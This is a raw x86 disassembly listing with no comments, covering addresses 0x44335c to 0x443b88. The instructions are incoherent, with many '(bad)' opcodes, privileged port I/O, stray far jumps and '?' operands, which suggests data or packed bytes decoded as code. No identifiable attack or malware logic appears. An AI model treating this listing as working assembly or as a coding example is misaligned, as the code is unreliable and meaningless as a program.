  44335c:	and    eax,0x4de58cb6
  443361:	sub    esp,DWORD PTR [ebx]
  443363:	adc    eax,0x6807f92c
  443368:	scas   al,BYTE PTR es:[edi]
  443369:	cmp    al,0xee
  44336b:	jmp    0xcc06:0xe0a36de
  443372:	inc    edi
  443373:	sbb    eax,0x2b50ee59
  443378:	mov    cl,0x20
  44337a:	mov    eax,esi
  44337c:	in     al,dx
  44337d:	jl     0x443367
  44337f:	jmp    0xe9f56731
  443384:	inc    DWORD PTR [edx+0x79e52844]
  44338a:	retf   0x87e8
  44338d:	pop    es
  44338e:	mov    bh,0x23
  443390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443391:	std    
  443392:	std    
  443393:	cmp    BYTE PTR [ebp+0x5bef955f],ah
  443399:	inc    edi
  44339a:	cld    
  44339b:	ret    
  44339c:	and    eax,0xd3e726ec
  4433a1:	jecxz  0x4433d1
  4433a3:	scas   al,BYTE PTR es:[edi]
  4433a4:	sbb    ch,BYTE PTR [ecx]
  4433a6:	dec    eax
  4433a7:	adc    eax,0xc6ee87b9
  4433ac:	xchg   ebp,eax
  4433ad:	adc    BYTE PTR [eax+ecx*1],bh
  4433b0:	out    0x28,eax
  4433b2:	push   edi
  4433b3:	fistp  DWORD PTR [eax-0x2ee6d1a0]
  4433b9:	sbb    BYTE PTR [eax],bh
  4433bb:	and    BYTE PTR [esi],ah
  4433bd:	clc    
  4433be:	mov    eax,0x8a09b134
  4433c3:	cs aad 0xbd
  4433c6:	cwde   
  4433c7:	lock hlt 
  4433c9:	addr16 popf 
  4433cb:	aad    0x99
  4433cd:	int    0x8a
  4433cf:	push   gs
  4433d1:	imul   edx,edx,0x27
  4433d4:	jne    0x44343a
  4433d6:	mov    ebp,eax
  4433d8:	pop    eax
  4433d9:	repnz fmul DWORD PTR [esi+edx*8+0x6e2867fb]
  4433e1:	int3   
  4433e2:	sbb    ebx,0xffffff9c
  4433e5:	xchg   esi,eax
  4433e6:	sbb    BYTE PTR [esi+0x24],0x59
  4433ea:	sbb    bh,0x8a
  4433ed:	inc    eax
  4433ee:	or     DWORD PTR [edx+0x30],ebp
  4433f1:	jbe    0x443460
  4433f3:	mov    al,ds:0xb94f594e
  4433f8:	cmp    al,0xd3
  4433fa:	mov    al,0x44
  4433fc:	popa   
  4433fd:	jecxz  0x44338a
  4433ff:	adc    eax,0xc4f55392
  443404:	and    DWORD PTR [ecx-0x5d91b5a1],edx
  44340a:	mov    ebp,DWORD PTR [esi+ecx*4+0x1e]
  44340e:	jne    0x4433ec
  443410:	mov    edx,0xaf79644a
  443415:	push   0xffffffab
  443417:	fadd   st,st(5)
  443419:	test   eax,0x96ca94b7
  44341e:	dec    eax
  44341f:	push   edi
  443420:	dec    ebp
  443421:	or     edi,DWORD PTR [edi+ebx*2]
  443424:	icebp  
  443425:	mov    eax,ds:0x7e5f278a
  44342a:	xor    ecx,0x7ddc8922
  443430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443431:	jb     0x443486
  443433:	inc    ebx
  443434:	sbb    BYTE PTR [ebx-0x21],bl
  443437:	stos   BYTE PTR es:[edi],al
  443438:	into   
  443439:	test   al,0x7b
  44343b:	lahf   
  44343c:	ror    BYTE PTR [ebp-0x7],cl
  44343f:	dec    edx
  443440:	dec    esp
  443441:	lods   al,BYTE PTR ds:[esi]
  443442:	aad    0xbf
  443444:	mov    ?,ecx
  443446:	pop    ecx
  443447:	xor    al,0x3b
  443449:	add    DWORD PTR ds:0xb19e77c1,ebp
  44344f:	retf   
  443450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443451:	pop    ebx
  443452:	outs   dx,DWORD PTR ds:[esi]
  443453:	lock inc ecx
  443455:	lock cmp eax,0x62891bd7
  44345b:	lea    ebx,[edx+0x4a]
  44345e:	lock inc edx
  443460:	shr    DWORD PTR [eax-0x7ae8f405],0xd5
  443467:	aad    0xe6
  443469:	(bad)  
  44346a:	mov    al,0x48
  44346c:	test   al,0x5b
  44346e:	mov    esp,0x33c219e4
  443473:	mov    edx,0xec6a8e65
  443478:	dec    eax
  443479:	loope  0x443428
  44347b:	lahf   
  44347c:	and    ecx,edi
  44347e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44347f:	sar    BYTE PTR [ebp+0x11],cl
  443482:	out    dx,al
  443483:	or     eax,0xce7d80ae
  443488:	out    dx,eax
  443489:	push   ss
  44348a:	add    BYTE PTR [esp+ebx*4-0x60],cl
  44348e:	jo     0x443424
  443490:	scas   al,BYTE PTR es:[edi]
  443491:	dec    ecx
  443492:	inc    eax
  443493:	pusha  
  443494:	fidiv  WORD PTR [ecx+esi*4-0x1626467c]
  44349b:	outs   dx,BYTE PTR ds:[esi]
  44349c:	test   DWORD PTR [eax+0x74e8edde],esi
  4434a2:	std    
  4434a3:	mov    BYTE PTR [ecx+edi*8],bl
  4434a6:	jns    0x443516
  4434a8:	addr16 sbb al,0x1e
  4434ab:	sub    eax,0xe0bba6fc
  4434b0:	lds    esi,FWORD PTR [ebx]
  4434b2:	icebp  
  4434b3:	pushf  
  4434b4:	mov    cl,0x12
  4434b6:	or     dh,ch
  4434b8:	push   0x21
  4434ba:	mov    ecx,0x75a1a994
  4434bf:	lods   al,BYTE PTR ds:[esi]
  4434c0:	(bad)  
  4434c1:	inc    edi
  4434c2:	adc    al,0x19
  4434c4:	sti    
  4434c5:	jle    0x44353c
  4434c7:	pop    ebx
  4434c8:	dec    edi
  4434c9:	je     0x443480
  4434cb:	arpl   WORD PTR [ebx-0x368b4d13],dx
  4434d1:	pop    eax
  4434d2:	dec    ecx
  4434d3:	outs   dx,DWORD PTR ds:[esi]
  4434d4:	and    eax,0x7be75b3f
  4434d9:	mov    esi,0x4ad8ac9e
  4434de:	mov    bh,0xfc
  4434e0:	sbb    DWORD PTR [ebp+0x3335224],edx
  4434e6:	add    DWORD PTR fs:0x38ec1476,edx
  4434ed:	lock push es
  4434ef:	mov    esi,0x5dedda12
  4434f4:	jmp    0xa9f94468
  4434f9:	stc    
  4434fa:	mov    edi,0x6bf1974c
  4434ff:	gs push cs
  443501:	pop    esp
  443502:	push   ebx
  443503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443504:	in     eax,dx
  443505:	inc    esi
  443506:	iret   
  443507:	call   0x82701e49
  44350c:	cld    
  44350d:	dec    ebx
  44350e:	push   ebp
  44350f:	cld    
  443510:	icebp  
  443511:	or     eax,DWORD PTR [ecx-0x3]
  443514:	je     0x443521
  443516:	mov    bl,0x88
  443518:	add    eax,0x1df2f4cd
  44351d:	jg     0x443598
  44351f:	and    DWORD PTR ds:0xbe9282d9,0x75
  443526:	xchg   edi,eax
  443527:	addr16 jb 0x4434d2
  44352a:	retf   
  44352b:	rcr    DWORD PTR [esp-0x44],1
  44352f:	jle    0x44359c
  443531:	daa    
  443532:	mov    cl,0xc1
  443534:	arpl   WORD PTR [esi],cx
  443536:	mov    esi,0x9e2d6544
  44353b:	popf   
  44353c:	test   DWORD PTR [ebx-0x4ad3184b],esp
  443542:	mov    ebp,0xabc073d0
  443547:	or     eax,0x44b55cf9
  44354c:	in     al,0x49
  44354e:	mov    DWORD PTR [edx-0x92a644b],edx
  443554:	test   BYTE PTR [eax-0x73],0x47
  443558:	xor    eax,0xd96fa1db
  44355d:	adc    DWORD PTR [ecx+0x7a907344],esi
  443563:	mov    ebx,0xe733ba05
  443568:	lods   al,BYTE PTR ds:[esi]
  443569:	fcom   QWORD PTR ds:0x9045acb1
  443570:	lds    eax,FWORD PTR [edi+0x46]
  443573:	in     eax,0x24
  443575:	pop    es
  443576:	loopne 0x4435b6
  443578:	add    eax,0x95e812df
  44357d:	mov    eax,ds:0x4cfd58a6
  443582:	dec    edi
  443583:	loope  0x443562
  443585:	adc    edi,ebx
  443587:	in     al,0x88
  443589:	inc    ebx
  44358a:	sbb    edx,DWORD PTR [ebx]
  44358c:	aad    0x32
  44358e:	mov    al,0xec
  443590:	xor    al,BYTE PTR [esi+edi*1]
  443593:	(bad)  
  443594:	pop    ss
  443595:	leave  
  443596:	fs inc esi
  443598:	dec    ecx
  443599:	add    eax,0x9fefff3b
  44359e:	cmp    edx,edx
  4435a0:	mov    ebp,0x99eea95e
  4435a5:	lock push eax
  4435a7:	sub    eax,0x54cad9f1
  4435ac:	inc    esi
  4435ad:	paddq  mm1,QWORD PTR [ebp+0x2fa8067]
  4435b4:	cmp    DWORD PTR [esi+0xa436fc8],ebx
  4435ba:	int3   
  4435bb:	hlt    
  4435bc:	inc    ecx
  4435bd:	out    0xaa,eax
  4435bf:	jmp    DWORD PTR [edx+0x25c28cd4]
  4435c5:	stc    
  4435c6:	lods   eax,DWORD PTR ds:[esi]
  4435c7:	mov    esp,0xd0b7f1cd
  4435cc:	arpl   WORD PTR [edi-0x41],di
  4435cf:	jg     0x443618
  4435d1:	sub    DWORD PTR [edi],ecx
  4435d3:	mov    bh,0x20
  4435d5:	ret    
  4435d6:	repnz mov BYTE PTR [edi-0x2bddc12a],bh
  4435dd:	fdiv   DWORD PTR [eax-0x7cb0908c]
  4435e3:	cdq    
  4435e4:	push   esi
  4435e5:	sti    
  4435e6:	mov    bl,0xe2
  4435e8:	add    esp,DWORD PTR [ebp+0x80f033f]
  4435ee:	inc    esi
  4435ef:	je     0x44360d
  4435f1:	cmp    DWORD PTR [eax-0x3d],ebp
  4435f4:	dec    edx
  4435f5:	addr16 or al,0xa6
  4435f8:	iret   
  4435f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4435fa:	(bad)  [edx-0x72]
  4435fd:	mov    ah,BYTE PTR [edx-0x2ae32ea9]
  443603:	gs mov ah,0xdf
  443606:	mov    ch,0xc4
  443608:	mov    ch,0x27
  44360a:	fwait
  44360b:	adc    eax,0x98b0237
  443610:	and    eax,0x55eff472
  443615:	pop    ds
  443616:	lods   eax,DWORD PTR ds:[esi]
  443617:	fldenv [edx-0x610b47cf]
  44361d:	push   cs
  44361e:	mov    eax,ds:0xc0fcd543
  443623:	lock out dx,al
  443625:	add    eax,DWORD PTR [ebx-0x45]
  443628:	add    ch,BYTE PTR [ebp-0x23]
  44362b:	dec    ebx
  44362c:	xchg   BYTE PTR [edi-0x12e09c87],bh
  443632:	popf   
  443633:	add    eax,0xb0cba7b1
  443638:	and    DWORD PTR es:[ecx+0x3feace50],0x48
  443640:	pop    ss
  443641:	(bad)  
  443643:	push   edx
  443644:	pop    esp
  443645:	mov    dl,0x2a
  443647:	adc    eax,DWORD PTR [edx-0x65]
  44364a:	sub    edx,DWORD PTR [edx-0x27344a4e]
  443650:	(bad)  
  443651:	fstp   QWORD PTR [edi+0x6e7cfee2]
  443657:	test   DWORD PTR [ebp+0xc],eax
  44365a:	pushf  
  44365b:	repz repnz mov eax,ds:0x3d464d0b
  443662:	push   es
  443663:	aam    0x82
  443665:	cwde   
  443666:	push   ss
  443667:	push   esi
  443669:	fs mov esi,0x2e3fa884
  44366f:	out    0xc5,eax
  443671:	sbb    BYTE PTR [ebx-0x19bfbf15],bl
  443677:	sub    DWORD PTR [edi-0x64bd63c7],eax
  44367d:	xchg   ebp,eax
  44367e:	or     eax,0x2c09183e
  443683:	aad    0xeb
  443685:	lahf   
  443686:	dec    ebx
  443687:	sub    eax,0xcab15738
  44368c:	fldenv [edi+0x18]
  44368f:	or     ecx,DWORD PTR [edx+0x12]
  443692:	and    BYTE PTR [ebp+0x1d],dh
  443695:	add    DWORD PTR [esi+0xbcfaf7b],esi
  44369b:	mov    DWORD PTR [ecx+0x78],edi
  44369e:	pop    ecx
  44369f:	add    BYTE PTR ds:0xe63a6438,ah
  4436a5:	jmp    0x1e2e:0x4d1cc685
  4436ac:	cwde   
  4436ad:	sbb    eax,0xf51502e9
  4436b2:	mov    cl,0xe9
  4436b4:	dec    ecx
  4436b5:	pop    edx
  4436b6:	pop    ecx
  4436b7:	lock pop ds
  4436b9:	test   eax,0xca399803
  4436be:	es push edi
  4436c0:	add    al,0x73
  4436c2:	mov    edi,0x1b2122dd
  4436c7:	fist   WORD PTR [esi]
  4436c9:	add    ebp,DWORD PTR [eax+0x2]
  4436cc:	sbb    al,0xf9
  4436ce:	test   BYTE PTR [eax+0x6c],dh
  4436d1:	clc    
  4436d2:	ds push ecx
  4436d4:	push   ss
  4436d5:	lahf   
  4436d6:	fwait
  4436d7:	call   0x79a52a6f
  4436dc:	std    
  4436dd:	push   ebx
  4436de:	out    dx,eax
  4436df:	cld    
  4436e0:	fdiv   DWORD PTR [edx*4-0x2b3be49b]
  4436e7:	out    dx,al
  4436e8:	sbb    DWORD PTR [ebp+ebp*8-0x32],0x79
  4436ed:	test   al,0xf3
  4436ef:	pop    ecx
  4436f0:	aad    0x96
  4436f2:	pop    edx
  4436f3:	loop   0x44376b
  4436f5:	pop    eax
  4436f6:	dec    esi
  4436f7:	or     al,0xff
  4436f9:	or     BYTE PTR [edi-0x19268d5a],ah
  4436ff:	clc    
  443700:	mov    ds:0xb570804c,eax
  443705:	(bad)  
  443707:	in     eax,dx
  443708:	mov    ch,0x37
  44370a:	mov    ebp,0x54191c5a
  44370f:	adc    al,0xd9
  443711:	imul   edi,DWORD PTR [edi-0x545e2da7],0xffffffa2
  443718:	dec    ebp
  443719:	and    eax,0x3df1663
  44371e:	fisubr WORD PTR [esi]
  443720:	mov    WORD PTR [edx],?
  443722:	mov    edi,0xf0b4b964
  443727:	test   eax,0xf29b6525
  44372c:	fidivr WORD PTR [esi-0x26062912]
  443732:	cmp    cl,cl
  443734:	(bad)  
  443735:	xor    al,BYTE PTR [edx+0x665fdda2]
  44373b:	lock push edx
  44373d:	or     al,0x6c
  44373f:	arpl   WORD PTR [edi],bx
  443741:	bound  esp,QWORD PTR [ebp-0x603bda08]
  443747:	icebp  
  443748:	sbb    ecx,ebx
  44374a:	push   ds
  44374b:	mov    edi,0x25bf33b6
  443750:	imul   esp,DWORD PTR [ebp+0x5bb3a47b],0xe
  443757:	cli    
  443758:	cwde   
  443759:	mov    edi,0x598b368b
  44375e:	jbe    0x4437dc
  443760:	and    eax,0xc3b64a7d
  443765:	add    al,0xbb
  443767:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  443769:	loope  0x4437d4
  44376b:	ret    
  44376c:	leave  
  44376d:	sahf   
  44376e:	add    ebp,ebx
  443770:	inc    edi
  443771:	dec    esp
  443772:	or     dh,0x3f
  443775:	cdq    
  443776:	inc    esi
  443777:	pop    esp
  443778:	xor    edi,DWORD PTR [edi]
  44377a:	in     eax,dx
  44377b:	mov    al,0x7b
  44377d:	fwait
  44377e:	out    dx,al
  44377f:	repnz cs repnz dec ebx
  443783:	out    dx,al
  443784:	push   es
  443785:	gs sub eax,0xfffa8d06
  44378b:	repnz sbb eax,0x874cc079
  443791:	push   ss
  443792:	mov    cl,al
  443794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443795:	in     al,dx
  443796:	dec    ebx
  443797:	ror    al,cl
  443799:	sbb    ebx,DWORD PTR [esi]
  44379b:	adc    ebp,ecx
  44379d:	mov    bl,0x61
  44379f:	call   DWORD PTR [ecx+edi*8-0x764651ff]
  4437a6:	mov    esp,0xbae3d7b4
  4437ab:	mov    edi,0xa98b9b55
  4437b0:	arpl   WORD PTR [edi-0x22],di
  4437b3:	aaa    
  4437b4:	sar    BYTE PTR [esi-0x46d54550],0xbb
  4437bb:	outs   dx,DWORD PTR ds:[esi]
  4437bc:	or     edi,DWORD PTR [edx+edi*4-0x6cd75e30]
  4437c3:	xchg   edx,eax
  4437c4:	adc    eax,0xcaed936f
  4437c9:	mov    ah,0x78
  4437cb:	test   BYTE PTR [edi-0x20],cl
  4437ce:	jmp    0xbad33e51
  4437d3:	xor    al,0x1a
  4437d5:	and    DWORD PTR [edx-0x61],esi
  4437d8:	sub    edi,ecx
  4437da:	ins    DWORD PTR es:[edi],dx
  4437db:	loope  0x443816
  4437dd:	sbb    al,0xbb
  4437df:	cld    
  4437e0:	dec    esp
  4437e1:	lahf   
  4437e2:	aad    0x13
  4437e4:	jnp    0x443787
  4437e6:	pop    ebx
  4437e7:	sub    BYTE PTR [eax-0x32],dl
  4437ea:	pop    ecx
  4437eb:	jecxz  0x4437e1
  4437ed:	test   DWORD PTR [edi+0x74],ecx
  4437f0:	imul   edi,ecx,0x9f3add22
  4437f6:	sub    edx,DWORD PTR [edi+0x64]
  4437f9:	jns    0x44385a
  4437fb:	repnz sbb eax,0x18a88769
  443801:	outs   dx,BYTE PTR ds:[esi]
  443802:	imul   ebp,ebp,0xb7136218
  443808:	xchg   ecx,eax
  443809:	jge    0x4437b8
  44380b:	cmp    bx,WORD PTR [edi-0x78b1feb1]
  443812:	or     ch,BYTE PTR [ebx+0x5d]
  443815:	mov    ecx,0x689488e5
  44381a:	sub    ebx,0xffffffe0
  44381d:	idiv   DWORD PTR [edi-0x236ce6a0]
  443823:	lds    edi,FWORD PTR [ebp+0x18]
  443826:	mov    cl,0x4c
  443828:	push   ds
  443829:	xchg   edi,eax
  44382a:	stos   BYTE PTR es:[edi],al
  44382b:	daa    
  44382c:	push   ss
  44382d:	enter  0x4bd,0xb7
  443831:	fldcw  WORD PTR [ebp-0x2dcd791a]
  443837:	push   ds
  443838:	int3   
  443839:	lds    ebp,FWORD PTR [eax+edi*8-0x7e493f25]
  443840:	repnz xlat BYTE PTR ds:[ebx]
  443842:	mov    edx,0xb7a50404
  443847:	xchg   DWORD PTR [ebp-0x70],esi
  44384a:	pop    ss
  44384b:	hlt    
  44384c:	mov    BYTE PTR ds:0x7919e100,bh
  443852:	stos   DWORD PTR es:[edi],eax
  443853:	enter  0xffad,0xfe
  443857:	mov    esp,0x627bb696
  44385c:	stc    
  44385d:	lahf   
  44385e:	lods   al,BYTE PTR ds:[esi]
  44385f:	jp     0x443895
  443861:	push   ds
  443862:	jns    0x44388c
  443864:	call   0xcd8366b5
  443869:	inc    ebx
  44386a:	pop    ebp
  44386b:	hlt    
  44386c:	jnp    0x443852
  44386e:	shl    eax,1
  443870:	xchg   ebp,eax
  443871:	pop    edx
  443872:	fucomip st,st(2)
  443874:	push   edi
  443875:	dec    edx
  443876:	mov    ah,0x98
  443878:	sbb    bh,BYTE PTR [eax-0x5db676f]
  44387e:	mov    edi,0xefb3bef4
  443883:	bound  esp,QWORD PTR [ebp+0x18]
  443886:	mov    bl,0xf2
  443888:	push   edx
  443889:	adc    ebx,0x57391e29
  44388f:	push   es
  443890:	xor    BYTE PTR [ecx],ch
  443892:	mov    dh,0x9b
  443894:	neg    BYTE PTR [ebp+0x3b943eab]
  44389a:	dec    ebx
  44389b:	or     BYTE PTR [ecx-0x22],0x3b
  44389f:	fnstenv [esi]
  4438a1:	sti    
  4438a2:	(bad)  
  4438a3:	aam    0xd7
  4438a5:	ret    0x6c57
  4438a8:	cwde   
  4438a9:	xchg   BYTE PTR [edi-0x4d],cl
  4438ac:	add    eax,0x60f1fce6
  4438b1:	and    eax,0x7ae3cffc
  4438b6:	ins    DWORD PTR es:[edi],dx
  4438b7:	xchg   DWORD PTR [esi+0x25],ebx
  4438ba:	or     DWORD PTR es:[eax+0x51],ebp
  4438be:	sti    
  4438bf:	daa    
  4438c0:	sub    eax,0x6234bc3d
  4438c5:	int    0xeb
  4438c7:	or     BYTE PTR [edx+eiz*8-0x4b65b4d6],dh
  4438ce:	mov    ebx,0x50e9749d
  4438d3:	js     0x44392b
  4438d5:	jno    0x443857
  4438d7:	repz popa 
  4438d9:	loop   0x44388b
  4438db:	mov    cl,BYTE PTR fs:[ecx-0x66e874e1]
  4438e2:	push   0xfffffffc
  4438e4:	out    0x35,eax
  4438e6:	inc    ebx
  4438e7:	inc    edx
  4438e8:	and    ecx,ebx
  4438ea:	pop    esi
  4438eb:	adc    DWORD PTR [ecx+0x10],0xffffffb1
  4438ef:	lods   al,BYTE PTR ds:[esi]
  4438f0:	aaa    
  4438f1:	sahf   
  4438f2:	dec    ebx
  4438f3:	push   0x2a38b77
  4438f8:	repz aas 
  4438fa:	push   0x77
  4438fc:	(bad)  
  4438fe:	mov    edi,0xb9125e44
  443903:	push   cs
  443904:	adc    eax,0x84e84867
  443909:	jo     0x4438ac
  44390b:	cdq    
  44390c:	enter  0x1ddc,0xd5
  443910:	xchg   ebp,eax
  443911:	sub    bh,BYTE PTR [ebp*8+0x4e86475b]
  443918:	lds    esp,FWORD PTR [ecx+0xd45688b]
  44391e:	aad    0xdd
  443920:	inc    ebx
  443921:	sbb    ecx,DWORD PTR [esi-0x33]
  443924:	xor    BYTE PTR [edi-0x1c4f1b4d],bl
  44392a:	loopne 0x44395f
  44392c:	jns    0x44395c
  44392e:	push   ebp
  44392f:	test   eax,0x9cbfc405
  443934:	in     eax,0x3f
  443936:	inc    ecx
  443937:	mov    eax,0x44b2d5b2
  44393c:	and    al,BYTE PTR [edx-0xeba1fe6]
  443942:	jmp    0x443937
  443944:	inc    ebx
  443945:	loop   0x44393e
  443947:	and    edi,edi
  443949:	mov    ecx,0x99ae9383
  44394e:	cmp    DWORD PTR [ebp*8+0x75bd5b0d],eax
  443955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443956:	mov    eax,DWORD PTR [edi-0x3e]
  443959:	jge    0x4439c4
  44395b:	or     DWORD PTR [edi],ebp
  44395d:	les    edi,FWORD PTR [ebx-0x425cf902]
  443963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443964:	sub    bl,BYTE PTR [ecx+0x59a6e1b1]
  44396a:	dec    eax
  44396b:	popa   
  44396c:	mov    al,ds:0xe6274ba8
  443971:	hlt    
  443972:	out    0x21,al
  443974:	push   edi
  443975:	add    BYTE PTR [ecx+0x7a764314],dh
  44397b:	outs   dx,BYTE PTR ds:[esi]
  44397c:	xor    eax,0xcef1fcb4
  443981:	mov    al,ds:0xa950be47
  443986:	test   DWORD PTR [eax-0x75],edi
  443989:	sub    BYTE PTR [ecx+0x17],al
  44398c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44398d:	mov    WORD PTR [edi],?
  44398f:	imul   eax,ebp,0x1de6e4fc
  443995:	call   0x1abb9826
  44399a:	(bad)  
  44399b:	aas    
  44399c:	and    ecx,ecx
  44399e:	mov    dh,0xe9
  4439a0:	jle    0x44394b
  4439a2:	push   edi
  4439a3:	mov    ecx,0x214381a6
  4439a8:	mov    esi,esi
  4439aa:	dec    edi
  4439ab:	fst    DWORD PTR [ecx+edx*2+0x3b]
  4439af:	xchg   edx,eax
  4439b0:	ret    0x51d9
  4439b3:	dec    esp
  4439b4:	dec    eax
  4439b5:	xchg   edi,eax
  4439b6:	mov    ch,0x52
  4439b8:	or     DWORD PTR [esi-0x4d],0xfffffff4
  4439bc:	add    esp,DWORD PTR [edi-0x4b0cff85]
  4439c2:	into   
  4439c3:	aas    
  4439c4:	adc    eax,0xda74209b
  4439c9:	pmaxsw mm2,QWORD PTR [eax+edi*1+0x22]
  4439ce:	xchg   esp,eax
  4439cf:	mov    al,ds:0x22fb9f81
  4439d4:	sbb    dh,BYTE PTR [ebx+0x77]
  4439d7:	push   eax
  4439d8:	jbe    0x443a41
  4439da:	fxch   st(1)
  4439dc:	lea    edx,[ebp+0x5771f4b4]
  4439e2:	scas   eax,DWORD PTR es:[edi]
  4439e3:	aas    
  4439e4:	cmp    eax,0x2557cba1
  4439e9:	sti    
  4439ea:	iret   
  4439eb:	dec    edi
  4439ec:	cld    
  4439ed:	out    dx,eax
  4439ee:	mov    ds:0xb47e149c,al
  4439f3:	push   esp
  4439f4:	shr    BYTE PTR ds:0xa46d4a73,0x4b
  4439fb:	test   eax,0x93ed9799
  443a00:	imul   esi,DWORD PTR [eax-0x498a9378],0xffffffb1
  443a07:	add    al,0x41
  443a09:	repz mov esi,0x2224a96b
  443a0f:	(bad)  
  443a10:	cmp    esi,ecx
  443a12:	mov    ah,0xe4
  443a14:	inc    ecx
  443a15:	std    
  443a16:	xor    bl,al
  443a18:	mov    al,0xd2
  443a1a:	scas   eax,DWORD PTR es:[edi]
  443a1b:	es and ecx,ebx
  443a1e:	lahf   
  443a1f:	fild   WORD PTR [esi-0x19]
  443a22:	and    esp,DWORD PTR [eax+0x45]
  443a25:	push   ebx
  443a26:	sbb    edi,esp
  443a28:	xchg   esi,eax
  443a29:	call   0x14796c4a
  443a2e:	lds    ebp,FWORD PTR [ebp+0x34b403fa]
  443a34:	test   DWORD PTR [ebp-0x418472c1],0x7cf5affc
  443a3e:	jecxz  0x443a74
  443a40:	xchg   edi,eax
  443a41:	push   edx
  443a42:	inc    esi
  443a43:	enter  0x694d,0x9c
  443a47:	mov    ah,0xbb
  443a49:	mov    DWORD PTR [ebx],esi
  443a4b:	(bad)  
  443a4c:	mov    ch,0x85
  443a4e:	les    esi,FWORD PTR [eax+0x26]
  443a51:	adc    cl,0x5d
  443a54:	and    DWORD PTR [ebp+0x67fa5faa],esi
  443a5a:	fisub  WORD PTR [esi+0xcf8f0f7]
  443a60:	dec    ebx
  443a61:	push   esi
  443a62:	mov    ebx,0x2c53f114
  443a67:	ficom  WORD PTR [edi-0x51]
  443a6a:	pusha  
  443a6b:	pop    esi
  443a6c:	and    eax,0x9da237e9
  443a71:	(bad)  
  443a72:	nop    DWORD PTR [esi]
  443a75:	mov    ds:0x2413ef7b,al
  443a7a:	push   esp
  443a7b:	adc    eax,0x483f0393
  443a80:	aad    0xa7
  443a82:	jge    0x443a5a
  443a84:	fwait
  443a85:	mov    ebp,eax
  443a87:	sar    BYTE PTR [esi],0x5
  443a8a:	test   al,0xe3
  443a8c:	popf   
  443a8d:	adc    eax,0xa868ed0a
  443a92:	pop    ebx
  443a93:	mov    DWORD PTR [ebp+0xc],edi
  443a96:	mov    esp,DWORD PTR [eax]
  443a98:	fst    DWORD PTR [ecx+0x6]
  443a9b:	inc    ebx
  443a9c:	in     eax,0x5d
  443a9e:	xchg   ecx,eax
  443a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443aa0:	pop    ebp
  443aa1:	push   es
  443aa2:	call   0xb32c:0xfba8abf2
  443aa9:	cmc    
  443aaa:	add    BYTE PTR [edi],bl
  443aac:	dec    esi
  443aad:	aaa    
  443aae:	aas    
  443aaf:	pop    ebx
  443ab0:	rol    DWORD PTR [eax+esi*4],0x4
  443ab4:	xor    eax,0x45bf7901
  443ab9:	xor    dl,BYTE PTR [eax]
  443abb:	lock sbb al,0x51
  443abe:	std    
  443abf:	fild   WORD PTR [edi+0x60]
  443ac2:	cmp    al,0x19
  443ac4:	jge    0x443b16
  443ac6:	je     0x443a4b
  443ac8:	(bad)  
  443ac9:	call   0x27af:0x8d0104b8
  443ad0:	ss lahf 
  443ad2:	ins    BYTE PTR es:[edi],dx
  443ad3:	fild   DWORD PTR [ecx+0x584edba0]
  443ad9:	iret   
  443ada:	cmp    DWORD PTR [ebx+0x29],esi
  443add:	stc    
  443ade:	pop    esi
  443adf:	mov    cl,0xd7
  443ae1:	aam    0xa7
  443ae3:	fsub   QWORD PTR cs:[ebp+0x5]
  443ae7:	stos   DWORD PTR es:[edi],eax
  443ae8:	lds    esi,FWORD PTR [esi]
  443aea:	in     eax,0xee
  443aec:	sub    ebp,DWORD PTR [ecx-0x1b]
  443aef:	jp     0x443b56
  443af1:	pop    es
  443af2:	pop    esp
  443af3:	push   ebp
  443af4:	push   ss
  443af5:	dec    ecx
  443af6:	aas    
  443af7:	xor    dh,al
  443af9:	dec    ebp
  443afa:	sub    dl,BYTE PTR [ebp+0x434b99fe]
  443b00:	sbb    BYTE PTR [esi+ecx*8+0x8],dh
  443b04:	fist   DWORD PTR [ebx-0x4a]
  443b07:	adc    ecx,DWORD PTR ds:0x51852433
  443b0d:	gs pop esp
  443b0f:	pop    ebp
  443b10:	inc    esp
  443b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443b12:	outs   dx,DWORD PTR ds:[esi]
  443b13:	out    0x87,eax
  443b15:	mov    al,ds:0xd995242e
  443b1a:	(bad)  
  443b1b:	in     al,0x74
  443b1d:	xchg   edi,eax
  443b1e:	loope  0x443b51
  443b20:	and    DWORD PTR [eax],edi
  443b22:	mov    bl,0xe4
  443b24:	aad    0x44
  443b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443b27:	add    al,0xf5
  443b29:	xchg   ebx,edi
  443b2b:	in     al,0x6a
  443b2d:	fs (bad) 
  443b2f:	xor    ah,BYTE PTR ds:0x7d217b09
  443b35:	push   ecx
  443b36:	dec    edi
  443b37:	inc    esp
  443b38:	or     eax,0xd1a9cd93
  443b3d:	fstp   DWORD PTR [edi+0x2e]
  443b40:	ins    DWORD PTR es:[edi],dx
  443b41:	popf   
  443b42:	adc    esi,DWORD PTR [ebp+0x6ec841ec]
  443b48:	shr    eax,1
  443b4a:	mov    esi,0xfe987354
  443b4f:	mov    ds:0x7f5b9e4d,eax
  443b54:	loope  0x443adc
  443b56:	les    ebp,FWORD PTR [edi-0x79]
  443b59:	shr    esp,1
  443b5b:	div    bh
  443b5d:	(bad)  
  443b5e:	mov    bh,0xc4
  443b60:	mov    esp,0x5ddda62a
  443b65:	mov    eax,ds:0xdd94d0b
  443b6a:	sbb    DWORD PTR [edx+0x76],edx
  443b6d:	mov    esi,0x2a2e31be
  443b72:	jo     0x443b59
  443b74:	rcr    BYTE PTR [ecx+0x39f2efeb],1
  443b7a:	cs js  0x443b62
  443b7d:	push   ebx
  443b7e:	outs   dx,BYTE PTR ds:[esi]
  443b7f:	cli    
  443b80:	retf   
  443b81:	lods   eax,DWORD PTR ds:[esi]
  443b82:	je     0x443bda
  443b84:	cmp    bh,BYTE PTR [ecx]
  443b86:	adc    BYTE PTR [ebx],cl
  443b88:	or     BYTE PTR [ecx+edi*4],cl
